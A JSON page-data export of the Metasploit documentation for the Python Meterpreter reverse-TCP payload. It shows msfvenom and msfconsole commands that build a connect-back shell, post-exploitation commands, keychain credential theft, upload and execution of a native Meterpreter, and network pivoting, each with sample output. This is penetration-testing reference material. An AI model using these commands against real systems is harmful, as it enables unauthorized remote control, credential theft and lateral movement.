{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/payload/python/meterpreter/reverse_tcp","result":{"data":{"moduleMetadataJson":{"id":"2bcf7d28-f4fa-55c3-9a36-09d5059a6bf0","name":"Python Meterpreter, Python Reverse TCP Stager","fullname":"payload/python/meterpreter/reverse_tcp","description":"Run a meterpreter server in Python (2.5-2.7 & 3.1-3.6). Connect back to the attacker","rank":300,"fields":{"detailsSlug":"/modules/details/payload/python/meterpreter/reverse_tcp","documentationSlug":"/modules/documentation/payload/python/meterpreter/reverse_tcp","referencesSlug":"/modules/references/payload/python/meterpreter/reverse_tcp"},"documentation":{"html":"<p>python/meterpreter/reverse_tcp allows you to remotely control the compromised system. It is a\nunique payload to the Metasploit Framework, because it is cross-platform. And since Python is\na very popular programming language, some operating systems such as Ubuntu even support it\nby default.</p>\n<p>When using an exploit, using a cross-platform payload like python/meterpreter/reverse_tcp also\nmeans you don't need to worry about which target/platform to select, the payload should work\nfor all of them.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>The Python Meterpreter is suitable for any systems that support Python. Some operating\nsystems such as Ubuntu, Debian, Arch Linux, and OS X have it by default. The Python\nMeterpreter supports the CPython implementation versions 2.5-2.7 and 3.1+.</p>\n<h2 id=\"deploying-pythonmeterpreterreverse_tcp\" style=\"position:relative;\"><a href=\"#deploying-pythonmeterpreterreverse_tcp\" aria-label=\"deploying pythonmeterpreterreverse_tcp permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Deploying python/meterpreter/reverse_tcp</h2>\n<p>python/meterpreter/reverse_tcp is typically used in two different ways.</p>\n<p>First, it can be used with an exploit as long as the Python platform is supported. This sort\nof information can usually be found when you use the <code class=\"language-text\">info</code> command like this:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(ms14_064_packager_python) &gt; info\n\n       Name: MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python\n     Module: exploit/windows/fileformat/ms14_064_packager_python\n   Platform: Python\n Privileged: No\n    License: Metasploit Framework License (BSD)\n       Rank: Excellent\n  Disclosed: 2014-11-12\n\n.... more info here ...</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Or, you can check the exploit's target list by doing <code class=\"language-text\">show targets</code>, there might be Python\non the list.</p>\n<p>If your exploit supports Python, here is how to load it:</p>\n<ol>\n<li>In msfconsole, select the exploit.</li>\n<li>Configure the options for that exploit.</li>\n<li>Do: <code class=\"language-text\">set PAYLOAD python/meterpreter/reverse_tcp</code></li>\n<li>Set the <code class=\"language-text\">LHOST</code> datastore option, which is the <a href=\"https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">IP that the payload should connect to</a>.</li>\n<li>Do <code class=\"language-text\">exploit</code>. If the exploit is successful, it should execute that payload.</li>\n</ol>\n<p>Another way to use the Python Meterpreter is to generate it as a Python file. Normally, you would\nwant to do this with msfvenom, like this:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">./msfvenom -p python/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f raw -o /tmp/python.py</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<h2 id=\"important-basic-commands\" style=\"position:relative;\"><a href=\"#important-basic-commands\" aria-label=\"important basic commands permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Important Basic Commands</h2>\n<p>Compared to a native Meterpreter such as windows/meterpreter/reverse_tcp, the Python Meterpreter\nhas less commands, but here's a list of all the common ones you might need:</p>\n<p><strong>pwd command</strong></p>\n<p>The <code class=\"language-text\">pwd</code> command tells you the current working directory. For example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; pwd\n/Users/sinn3r/Desktop</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p><strong>cd command</strong></p>\n<p>The <code class=\"language-text\">cd</code> command allows you to change directories. Example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; cd /Users/sinn3r/Desktop\nmeterpreter &gt; pwd\n/Users/sinn3r/Desktop</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p><strong>cat command</strong></p>\n<p>The <code class=\"language-text\">cat</code> command allows you to see the content of a file:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; cat /tmp/data.txt\nHello World!</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p><strong>upload command</strong></p>\n<p>The <code class=\"language-text\">upload</code> command allows you to upload a file to the remote target. For example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; upload /tmp/data.txt /Users/sinn3r/Desktop\n[*] uploading  : /tmp/data.txt -&gt; /Users/sinn3r/Desktop\n[*] uploaded   : /tmp/data.txt -&gt; /Users/sinn3r/Desktop/data.txt\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p><strong>download command</strong></p>\n<p>The <code class=\"language-text\">download</code> command allows you to download a file from the remote target to your machine.\nFor example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; download /Users/sinn3r/Desktop/data.txt /tmp/pass.txt\n[*] downloading: /Users/sinn3r/Desktop/data.txt -&gt; /tmp/pass.txt/data.txt\n[*] download   : /Users/sinn3r/Desktop/data.txt -&gt; /tmp/pass.txt/data.txt\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p><strong>search command</strong></p>\n<p>The <code class=\"language-text\">search</code> command allows you to find files on the remote file system. For example,\nthis shows how to find all text files in the current directory:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; search -d . -f *.txt\nFound 2 results...\n    .\\pass.txt (13 bytes)\n    ./creds\\data.txt (83 bytes)\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Without the <code class=\"language-text\">-d</code> option, the command will attempt to search in all drives.</p>\n<p>The <code class=\"language-text\">-r</code> option for the command allows you to search recursively.</p>\n<p><strong>getuid command</strong></p>\n<p>The <code class=\"language-text\">getuid</code> command tells you the current user that Meterpreter is running on. For example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; getuid\nServer username: root</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p><strong>execute command</strong></p>\n<p>The <code class=\"language-text\">execute</code> command allows you to execute a command or file on the remote machine.</p>\n<p>The following examples uses the command to create a text file:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; execute -f echo -a &quot;hello &gt; /tmp/hello.txt&quot;\nProcess 73642 created.\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p><strong>ps command</strong></p>\n<p>The <code class=\"language-text\">ps</code> command lists the running processes on the remote machine.</p>\n<p><strong>shell command</strong></p>\n<p>The <code class=\"language-text\">shell</code> command allows you to interact with the remote machine's command prompt (or shell).\nFor example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; shell\nProcess 74513 created.\nChannel 2 created.\nsh-3.2#</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>If you wish to get back to Meterpreter, do [CTRL]+[Z] to background the channel.</p>\n<p><strong>sysinfo</strong></p>\n<p>The <code class=\"language-text\">sysinfo</code> command shows you basic information about the remote machine. Such as:</p>\n<ul>\n<li>Computer name</li>\n<li>OS name</li>\n<li>Architecture</li>\n<li>Meterpreter type</li>\n</ul>\n<h2 id=\"using-a-post-module\" style=\"position:relative;\"><a href=\"#using-a-post-module\" aria-label=\"using a post module permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Using a Post Module</h2>\n<p>One of the best things about Meterprter is you have access to a variety of post modules that\n\"shell\" sessions might not have. Post modules provide you with more capabilities to collect\ndata from the remote machine automatically. For example, stealing credentials from the system\nor third-party applications, or modify settings, etc.</p>\n<p>To use a post module from the Meterpreter prompt, simply use the <code class=\"language-text\">run</code> command. The following\nis an example of collecting OS X keychain information using the enum_keychain post module:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; run post/osx/gather/enum_keychain\n\n[*] The following keychains for root were found:\n    &quot;/Users/sinn3r/Library/Keychains/login.keychain&quot;\n    &quot;/Library/Keychains/System.keychain&quot;\n[+] 192.168.1.209:58023 - Keychain information saved in /Users/sinn3r/.msf4/loot/20160705211412_http_192.168.1.209_macosx.keychain._271980.txt\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"using-the-post-exploitation-api-in-irb\" style=\"position:relative;\"><a href=\"#using-the-post-exploitation-api-in-irb\" aria-label=\"using the post exploitation api in irb permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Using the Post Exploitation API in IRB</h2>\n<p>To enter IRB, do the following at the Meterpreter prompt:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; irb\n[*] Starting IRB shell\n[*] The &#39;client&#39; variable holds the meterpreter client\n\n&gt;&gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p><strong>The client object</strong></p>\n<p>The client object in Meterpreter allows you to control or retrieve information about the host. For\nexample, this allows you to get the current privilege our payload is running as:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&gt;&gt; client.sys.config.getuid\n=&gt; &quot;root&quot;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>To explore the client object, there are a few tricks. For example, you can use the #inspect method\nto inspect it:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&gt;&gt; client.inspect</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>You can also use the #methods method to see what methods you can use:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&gt;&gt; client.methods</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>To review the source of the method, you can use the #source_location method. For example, say we\nwant to see the source code for the #getuid method:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&gt;&gt; client.sys.config.method(:getuid).source_location\n=&gt; [&quot;/Users/sinn3r/rapid7/msf/lib/rex/post/meterpreter/extensions/stdapi/sys/config.rb&quot;, 32]</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>The first element of the array is the location of the file. The second is the line number of\nthe method.</p>\n<p><strong>Railgun</strong></p>\n<p>If you are familiar with using the post exploitation API for Windows, you probably know about\nRailgun. Unfortunately, Railgun is not available in Python Meterpreters.</p>\n<h2 id=\"switching-to-a-native-meterpreter\" style=\"position:relative;\"><a href=\"#switching-to-a-native-meterpreter\" aria-label=\"switching to a native meterpreter permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Switching to a Native Meterpreter</h2>\n<p>The Python Meterpreter currently does not quite have the same strength as a native Meterpreter,\ntherefore there are times you will want to migrate to a native one to expose yourself with more\nfeatures.</p>\n<p>There are many ways to migrate to a native Meterpreter, some common approaches:</p>\n<p><strong>Example 1: Upload and Execute</strong></p>\n<p>Step 1: Produce a native Meterpreter, such as:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">./msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=5555 -f exe -o /tmp/native.exe</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>Step 2: Start another handler for the native payload:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">./msfconsole -q -x &quot;use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST [IP]; set LPORT 5555; run&quot;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>Step 3: Upload the native via the Python Meterpreter session:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; upload /tmp/native.exe C:\\\\Users\\\\sinn3r\\\\Desktop\n[*] uploading  : /tmp/native.exe -&gt; C:\\Users\\sinn3r\\Desktop\n[*] uploaded   : /tmp/native.exe -&gt; C:\\Users\\sinn3r\\Desktop\\native.exe\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Step 4: Execute the native payload:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; execute -H -f C:\\\\Users\\\\sinn3r\\\\Desktop\\\\native.exe\nProcess 2764 created.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>And then your other handler (for the native payload) should receive that session:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[*] Starting the payload handler...\n[*] Sending stage (957999 bytes) to 192.168.1.220\n[*] Meterpreter session 1 opened (192.168.1.209:5555 -&gt; 192.168.1.220:49306) at 2016-07-05 21:48:04 -0500\n\nmeterpreter &gt; sysinfo\nComputer        : WIN-6NH0Q8CJQVM\nOS              : Windows 7 (Build 7601, Service Pack 1).\nArchitecture    : x86\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x86/win32\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p><strong>Example 2: Using exploit/multi/script/web_delivery</strong></p>\n<p>Another way to migrate to a native Meterpreter is by using the exploit/multi/script/web_delivery\nmodule. To learn how, please read the module documentation for that module.</p>\n<h2 id=\"routing-through-the-portfwd-command\" style=\"position:relative;\"><a href=\"#routing-through-the-portfwd-command\" aria-label=\"routing through the portfwd command permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Routing through the portfwd command</h2>\n<p>The portfwd command allows you to talk to a remote service like it's local. For example, if you\ncannot talk to the SMB service remotely on the compromised host because it is firewalled, then\nyou can use portfwd to establish that tunnel:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; portfwd add -l 445 -p 445 -r 192.168.1.220\n[*] Local TCP relay created: :445 &lt;-&gt; 192.168.1.220:445\nmeterpreter &gt; portfwd\n\nActive Port Forwards\n====================\n\n   Index  Local        Remote             Direction\n   -----  -----        ------             ---------\n   1      0.0.0.0:445  192.168.1.220:445  Forward</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>And then talk to it like it's a local service:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf auxiliary(smb_version) &gt; run\n\n[*] 127.0.0.1:445         - Host is running Windows 7 Ultimate SP1 (build:7601)\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"routing-through-msfconsole\" style=\"position:relative;\"><a href=\"#routing-through-msfconsole\" aria-label=\"routing through msfconsole permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Routing through msfconsole</h2>\n<p>The route command from the msf prompt can also be used to bypass firewall like portfwd, but it also\nallows you to connect to hosts on a different network through the compromised machine.</p>\n<p>To do that, first off, look at the ifconfig/ipconfig output and determine your pivot point:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; ipconfig</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>Make sure you know the subnet, netmask, and the Meterpreter/session ID. Return to the msf prompt,\nand establish that route:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; route add 192.168.1.0 255.255.255.0 1</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>At that point, you should have a working pivot. You can use other Metasploit modules to explore\nor exploit more hosts on the network, or use auxiliary/server/socks4a and <a href=\"http://proxychains.sourceforge.net/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Proxychains</a> to allow\nother third-party tools to do the same.</p>"}}},"pageContext":{"id":"2bcf7d28-f4fa-55c3-9a36-09d5059a6bf0"}}}